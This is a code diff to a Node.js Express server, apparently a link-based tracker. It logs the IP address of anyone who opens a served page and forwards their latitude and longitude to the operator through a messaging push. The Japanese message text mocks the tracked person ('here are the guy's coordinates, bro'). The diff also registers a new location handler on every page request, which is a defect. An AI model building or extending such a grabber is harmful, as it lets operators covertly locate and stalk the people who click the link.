@@ -106,11 +106,12 @@ app
   .get("/get/ip/nero", (req, res) => {
     const nom = req.query.name, id = req.query.id;
     original = req.query.original;
-    const query = {
-      id: id,
-      name: nom
-    };
-    res.sendFile(__dirname + '/open.html?' + qs.stringify(query));
+    app.post("/geo", (Req, Res) => {
+      Res.sendStatus(200);
+      pushMsg(`${nom}さんがなんと位置情報を許可しました...こちらが奴の緯度経度ですよ、兄貴\n\n緯度: ${Req.body.lat}\n経度: ${Req.body.lng}`, id);
+      return;
+    });
+    res.sendFile(__dirname + '/open.html');
     // get ip
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
     str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
@@ -128,11 +129,6 @@ app
   .get("/auth", (req, res) => {
     const URL = original || "https://rhipsali.github.io/get_ip";
     res.send(JSON.stringify({url: URL}));
-  })
-  .post("/geo", (req, res) => {
-    res.sendStatus(200);
-    const id = req.query.id, name = req.query.name;
-    pushMsg(`${name}さんがなんと位置情報を許可しました...こちらが奴の緯度経度ですよ、兄貴\n\n緯度: ${req.body.lat}\n経度: ${req.body.lng}`, id);
   })
   .listen(port, () => console.log("listening on " + port))
 ;
